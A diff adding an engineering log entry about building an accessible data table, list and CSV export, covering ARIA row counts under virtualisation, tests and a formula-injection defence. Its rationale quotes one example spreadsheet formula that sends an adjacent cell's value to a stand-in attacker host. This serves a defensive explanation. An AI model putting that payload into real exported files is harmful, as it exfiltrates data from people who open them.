@@ -60,6 +60,58 @@ expensive knowledge lives.
 
 ## Entries
 
+## IMPL-018 — STEP-003.04 — Table, list and CSV export
+
+| Field | Value |
+| --- | --- |
+| Date | 2026-08-07 |
+| Author | Deepesh Kumar Gupta |
+| Requirements | REQ-A11Y-002 (also REQ-A11Y-003) |
+| Blast radius | [BR-021](blast-radius/BR-021-table-list-csv.md) (MEDIUM) |
+| Commit | see git log for this entry |
+| Graph indexed commit | `c358d4b` — matched HEAD at pre-change |
+
+### What was built
+`packages/ui/src/data/` — `table.tsx` (DataTable, DataList) and `csv.ts`. 27 tests (179 in the package).
+
+### Why this approach
+**Virtualisation must not lie about size.** Rendering 20 of 10,000 rows is how a table stays fast, and it is also how a screen reader comes to announce "row 3 of 20" — telling the user the dataset is 500 times smaller than it is, with no way to discover otherwise. `aria-rowcount` on the table and `aria-rowindex` on each row carry the true totals independently of the DOM, so a virtualised row 4,001 announces itself as 4,001. Both are computed from the full set; the window is a rendering concern only.
+
+**No virtualisation library was adopted.** The sub-step warns that they "frequently break AT row counts", so `virtualWindow` is a plain prop: the caller picks the slice, the component keeps the ARIA contract correct regardless. Any library adopted later must pass these tests, which now exist first.
+
+**CSV export is a security surface, not a formatting convenience.** A cell starting `=`, `+`, `-`, `@`, tab or CR is executed as a formula by Excel, LibreOffice and Sheets. A trip note reading `=HYPERLINK("https://evil.example/?d="&A1,"Click me")` exfiltrates the adjacent cell when a colleague opens the shared file. The attacker never touches our servers — they type into a field we faithfully export.
+
+Our data makes this worse than average: briefs and comments are free text, and exports are meant to be shared. Dangerous cells are prefixed with `'`, which spreadsheets render as literal text — the value survives, the execution does not.
+
+**Export uses the full sorted set, never the rendered window.** Exporting what happens to be on screen hands the user a silently truncated file. Asserted with a 500-row dataset and a 10-row window.
+
+**`aria-sort` on the sorted column only.** Setting `"none"` on every other header is noise a screen reader announces on each cell.
+
+**The list keeps every header attached to its value** via a definition list. A responsive table that drops headers on small screens conveys strictly less than the wide one, which `REQ-A11Y-002` does not permit.
+
+### Verification performed
+| Check | Result |
+| --- | --- |
+| `pnpm verify` | **PASS** — 335 Python + 41 web + 179 UI |
+| axe, WCAG 2.2 AA | Zero violations: table, list, empty table, virtualised table |
+| Guard meta-suite | 36/36 |
+
+**Mutation testing — 6/6 killed:** `aria-rowcount` reporting the window, `aria-rowindex` restarting per window, the formula-injection defence removed, export truncated to the window, `scope` dropped from headers, and `aria-sort="none"` on every column.
+
+### Surprises
+**A suppression comment that suppressed nothing.** Biome reported that my `biome-ignore` in `dialog.tsx` had no effect — the rule never fired there. Removed rather than left in place: a suppression claiming a rule applies where it does not teaches the next reader to trust a constraint that is not there.
+
+**Biome preferred `<section>` to `role="region"`**, and was right — a native element carries the role implicitly and cannot lose it to a typo. Fixing it, I put a JSX comment before the root element of a `return` and broke the parse; the rationale moved to the doc comment where it belongs.
+
+### Follow-ups
+| Item | Owner step |
+| --- | --- |
+| Real windowing (measurement, scroll sync) | STEP-011, first large dataset |
+| Arrow-key grid navigation, if a dataset needs it | Deferred — a native table is already navigable by screen-reader table commands |
+| Verify any virtualisation library against these row-count tests | Before adopting one |
+
+---
+
 ## IMPL-017 — STEP-003.03 — Feedback primitives: dialog, notification, empty, error, skeleton
 
 | Field | Value |
